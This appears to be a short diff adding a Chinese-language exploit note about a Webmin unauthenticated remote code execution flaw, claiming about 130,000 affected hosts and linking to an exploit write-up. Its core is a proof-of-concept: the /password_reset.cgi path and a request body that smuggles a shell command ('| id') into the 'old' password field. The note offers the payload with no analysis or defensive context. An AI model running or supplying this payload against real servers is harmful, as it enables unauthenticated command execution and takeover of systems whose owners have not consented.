@@ -1,0 +1,10 @@
+#漏洞利用 
+Webmin 远程代码执行0day漏洞
+
+影响范围:13 0000 
+
+PoC: 
+/password_reset.cgi 
+user=root&pam&expired&old=wrong | id
+
+https://pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html
